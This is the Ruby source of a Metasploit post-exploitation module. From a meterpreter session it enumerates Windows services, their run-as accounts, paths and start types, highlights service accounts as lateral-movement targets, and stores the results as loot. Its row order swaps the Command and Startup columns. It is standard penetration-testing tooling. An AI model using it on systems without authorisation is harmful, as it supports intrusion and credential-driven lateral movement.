##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Services

  def initialize(info={})
    super(update_info(info,
      'Name'                 => "Windows Gather Service Info Enumeration",
      'Description'          => %q{
        This module will query the system for services and display name and
        configuration info for each returned service. It allows you to
        optionally search the credentials, path, or start type for a string
        and only return the results that match. These query operations are
        cumulative and if no query strings are specified, it just returns all
        services.  NOTE: If the script hangs, windows firewall is most likely
        on and you did not migrate to a safe process (explorer.exe for
        example).
        },
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'Author'               => ['Keith Faber', 'Kx499']
    ))
    register_options(
      [
        OptString.new('CRED', [ false, 'String to search credentials for' ]),
        OptString.new('PATH', [ false, 'String to search path for' ]),
        OptEnum.new('TYPE', [true, 'Service startup Option', 'All', ['All', 'Auto', 'Manual', 'Disabled' ]])
      ])
  end


  def run

    # set vars
    credentialCount = {}
    qcred = datastore["CRED"] || nil
    qpath = datastore["PATH"] || nil

    if datastore["TYPE"] == "All"
      qtype = nil
    else
      qtype = datastore["TYPE"].downcase
    end

    if qcred
      qcred = qcred.downcase
      print_status("Credential Filter: #{qcred}")
    end

    if qpath
      qpath = qpath.downcase
      print_status("Executable Path Filter: #{qpath}")
    end

    if qtype
      print_status("Start Type Filter: #{qtype}")
    end

    results_table = Rex::Text::Table.new(
        'Header'     => 'Services',
        'Indent'     => 1,
        'SortIndex'  => 0,
        'Columns'    => ['Name', 'Credentials', 'Command', 'Startup']
    )

    print_status("Listing Service Info for matching services, please wait...")
    service_list.each do |srv|
      srv_conf = {}

      # make sure we got a service name
      if srv[:name]
        begin
          srv_conf = service_info(srv[:name])
          if srv_conf[:startname]
            # filter service based on filters passed, the are cumulative
            if qcred && !srv_conf[:startname].downcase.include?(qcred)
              next
            end

            if qpath && !srv_conf[:path].downcase.include?(qpath)
              next
            end

            # There may not be a 'Startup', need to check nil
            if qtype && !(START_TYPE[srv_conf[:starttype]] || '').downcase.include?(qtype)
              next
            end

            # count the occurance of specific credentials services are running as
            serviceCred = srv_conf[:startname].upcase
            unless serviceCred.empty?
              if credentialCount.has_key?(serviceCred)
                credentialCount[serviceCred] += 1
              else
                credentialCount[serviceCred] = 1
                # let the user know a new service account has been detected for possible lateral
                # movement opportunities
                print_good("New service credential detected: #{srv[:name]} is running as '#{srv_conf[:startname]}'")
              end
            end

            results_table << [srv[:name],
                              srv_conf[:startname],
                              START_TYPE[srv_conf[:starttype]],
                              srv_conf[:path]]
          end

        rescue RuntimeError => e
          print_error("An error occurred enumerating service: #{srv[:name]}: #{e}")
        end
      else
        print_error("Problem enumerating service - no service name found")
      end
    end

    print_line results_table.to_s

    # store loot on completion of collection
    p = store_loot("windows.services", "text/plain", session, results_table.to_s, "windows_services.txt", "Windows Services")
    print_good("Loot file stored in: #{p.to_s}")
  end
end
